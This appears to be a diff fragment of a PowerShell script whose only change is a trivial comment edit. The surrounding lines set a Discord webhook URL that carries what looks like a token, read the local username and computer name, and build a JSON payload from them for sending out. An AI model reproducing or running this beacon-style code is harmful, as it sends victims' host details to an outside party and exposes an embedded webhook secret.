@@ -5,7 +5,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1497759278688108684/TxQm07mx_BX6
 $username = $env:USERNAME
 $computerName = $env:COMPUTERNAME
 
-# a
+# asd
 $payload = @{
     content = "User: $username`nComputer: $computerName"
 } | ConvertTo-Json
